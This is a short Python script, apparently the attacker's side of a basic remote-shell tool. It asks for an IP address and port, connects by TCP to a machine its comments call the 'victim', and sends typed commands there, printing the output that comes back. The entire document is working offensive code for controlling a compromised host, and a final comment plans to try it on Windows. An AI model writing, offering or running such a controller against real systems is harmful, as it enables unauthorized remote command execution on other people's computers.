import socket
import subprocess



ip = input("Enter ip address")
port = int(input("Enter port number "))

try:
    # we going to create a tcp ipv4 socket
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    #this socket will connect to victim and asks for command
    s.connect((ip,port))
    cmdlet = input("$")
    while cmdlet!='quit':
        
        #sending to victim
        s.send(cmdlet.encode())

        #2048 is number of bytes we want to recieve
        result = s.recv(2048).decode()
        print(result)
        cmdlet = input("$")
        
    s.close()
except:
    print("something error has occurred")

#first we try on windows